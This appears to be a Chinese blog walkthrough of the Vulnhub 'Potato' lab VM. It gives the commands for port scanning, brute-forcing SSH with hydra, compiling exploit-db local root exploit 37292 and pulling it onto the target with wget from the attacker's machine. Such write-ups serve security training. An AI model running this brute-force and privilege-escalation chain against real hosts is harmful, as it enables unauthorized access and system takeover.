> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483839&idx=1&sn=ae6633a9411e9e57a8390b5bba2e5e82&chksm=eb4ec802dc39411410a931b6a1cfd6593814bf6755c6ef970c795ee5740bfdca6c8ea0ebd505&mpshare=1&scene=23&srcid=1206r7ubjZPDzODeXxlnw44o&sharer_sharetime=1607243630492&sharer_shareid=63b7ebf9aba7281f878ee398cec8f649#rd)

点击蓝字，关注我们

0x00 靶机信息

靶机：Potato  

难度：简单

Vulnhub 下载: 

https://www.vulnhub.com/entry/potato-suncsr-1,556/

公众号回复：Potato （获取国内不限速下载链接）

0x01 信息收集

Nmap 扫描当前网段，寻找目标靶机 IP  

```
Nmap -sP 192.168.12.1/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2CfEkO3Z7uZMQH9PvMnUyytddUSxEWwSy8RF1D8MILuUGfmMocdxMibAA/640?wx_fmt=png)

Nmap 扫描端口

```
Nmap -p 1-65535 192.168.12.131
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2Cylz99ibSJcKM4OLxMbwDNghfXcbUGHoBe1WvApyFg7swnaChjKREfbw/640?wx_fmt=png)

只开放了 80，7120 端口

Dirb 扫描目录

```
Dirb http://192.168.12.131
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2C0mcbKJkOOZNVjVEdXiapI2iaiaoJywiboCiaqMUABETpn1SrAoJbWOsOXxQ/640?wx_fmt=png)

发现存在 info.php

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2Cw8h3WVxP5RiauR4ibbTtCBCfcGFmPw9aYsQBicQ7H4rtshBz9abl1DJWQ/640?wx_fmt=png)

看了一会没有发现什么利用点，转向一个未知的 7120 端口

折腾好一会，发现是 ssh 端口

```
ssh -p 7120 root@192.168.12.131
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2CRyc2K3wSNQfNXkk9OVOZq6F6e2xf84IvPfdW1x6qaibgq9CNEOgPvXg/640?wx_fmt=png)

0x02 漏洞利用

直接开始爆破  

```
hydra -l potato -P /usr/share/wordlists/rockyou.txt -vV ssh://192.168.12.131:7120
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2CtD16glMnPlJCRol7TdG9bJcvWVqBBox7SdeaZU4lbzCghpsocCBb7A/640?wx_fmt=png)

```
用户名：potato
密码：letmein
```

查看内核版本

```
uname -a
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2C4PnhkK33svhwTJ6lQsj6QGsIq91dWysiaFzITTd5ZnSMMGOW43SPCFg/640?wx_fmt=png)

查找相关漏洞

```
searchsploit ubuntu 3.13.0
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2CBIZKGMhq6ksRcLgIeDaMabIx6aHejKAdY3MwbCiciaHjtPic0MLlzRiaxQ/640?wx_fmt=png)

第一个符合条件，开始利用

编译 exp

```
gcc /usr/share/exploitdb/exploits/linux/local/37292.c -o exp
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2CQI5Tt1Cic6A4yoOuFvKLw8B0NicuaAaVibP9qCFHoUgVu5mmqnVqFxH0Q/640?wx_fmt=png)

0x03 提权

开启 apache2，将 exp 放到网站目录下  

```
service apache2 start
cp exp /var/www/html
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2Crz8iaiauETxcRwqNsCibiaxjBNxrVQs7y3ryXqVRibUp0bYfVDZ7eKSDiatQ/640?wx_fmt=png)

Wget 下载 exp

```
wget http://192.168.12.130/exp
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2CehTSto5ic5CxhNicC0gPqN0j1JIJickQ9Wl5G2yJzRye2lB2GT0UdcqbA/640?wx_fmt=png)

执行 exp

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2CdEbwzCHGw6xupkCqRsqgtYicp8qUOmiclCyCzfkxIhCGbJW2gicjLgbicA/640?wx_fmt=png)

得到 flag

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2Ck2uUpKu7NFNWFoaSVSOg1Tic512PRSHiaArbq1PUiaIoicaW59wZKxsDaw/640?wx_fmt=png)

 **往期推荐 ·**

  

[Vulnhub 篇 Tomato](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483796&idx=1&sn=1f7ec28258d61d2761627582e8d8ad0e&chksm=eb4ec829dc39413f8a4af153eac211f41d38a23f2823e92037417deea95ecd9aedf57f4a8d29&scene=21#wechat_redirect)  

[Vulnhub 篇 chili](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483773&idx=1&sn=6d0e5dc2f04a1cec1f01b4848a4a1582&chksm=eb4ec8c0dc3941d638f47dcb06959d7ae311a9d5a8d38780f397f899f31766bbadb3606f3f18&scene=21#wechat_redirect)  

[Vulnhub 篇 presidential:1](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483700&idx=1&sn=5a54f2be75bd9bdf0d3a84367ea8afb2&chksm=eb4ec889dc39419f55e446dafd3e5aa26379cbc24b048b3d7624a3fb510ad87847b828b6e1b4&scene=21#wechat_redirect)  

[Vulnhub 篇 Photographerr:1](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483673&idx=1&sn=c1f22eebcf5affb13ae324af7a030449&chksm=eb4ec8a4dc3941b21b2078a6e5d84462ac0ae5253b9176c12d9e3d53539ba27e2d8fbe36f85f&scene=21#wechat_redirect)  

![](https://mmbiz.qpic.cn/mmbiz_gif/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2CG6BmCEH2V6oy6icp4IePbsGgfp30jfAgV0tJEAbiaxI3Jp5yKzXrgpcA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_jpg/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2CG7ib1PL3DFiaQsVDEuMzmzJeX72aMiboWBnK9UZDB9moxz5jkcdI4Lzyg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/F3c71CW7Csfy7icibRNyiboanAJIPZeDo2CiarqWFvTITLPNL2oFMGx6nIkZK14NVDoU4y98naKJeibFnMNPpodVRfw/640?wx_fmt=gif)

长按识别二维码关注我们